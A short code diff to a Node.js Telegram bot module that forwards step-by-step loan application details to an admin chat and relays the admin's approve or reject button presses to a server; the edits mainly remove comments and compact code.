@@ -1,4 +1,4 @@
-const TelegramBot = require("node-telegram-bot-api");
+const TelegramBot = require("node-telegram-bot-api"); // MUST match package.json
 const axios = require("axios");
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
@@ -7,15 +7,12 @@ const SERVER_URL = process.env.RENDER_EXTERNAL_URL;
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Formatters
 const escapeHTML = (str) => String(str || "N/A").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 const currency = (n) => `TZS ${Number(n || 0).toLocaleString()}`;
 
 const send = (msg, options = {}) => {
     return bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: "HTML", ...options });
 };
-
-// --- INDIVIDUAL STEP SENDERS ---
 
 const sendStep1 = (d) => send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);
 
@@ -36,26 +33,18 @@ const sendStep5 = (d) => {
     });
 };
 
-// Callback for Buttons
 bot.on("callback_query", async (query) => {
     const [action, socketId] = query.data.split("_");
     const message = query.message;
-
     try {
-        await axios.post(`${SERVER_URL}/admin/action`, { 
-            socketId, 
-            action: action === "apr" ? "approve" : "reject" 
-        });
-
+        await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: action === "apr" ? "approve" : "reject" });
         const statusText = action === "apr" ? "✅ APPROVED" : "❌ REJECTED";
         bot.editMessageText(`${message.text}\n\n${statusText} BY ADMIN`, {
             chat_id: ADMIN_CHAT_ID,
             message_id: message.message_id,
             parse_mode: "HTML"
         });
-    } catch (err) {
-        console.error("Callback Error:", err.message);
-    }
+    } catch (err) { console.error("Callback error"); }
 });
 
 module.exports = { sendStep1, sendStep2, sendStep3, sendStep4, sendStep5 };
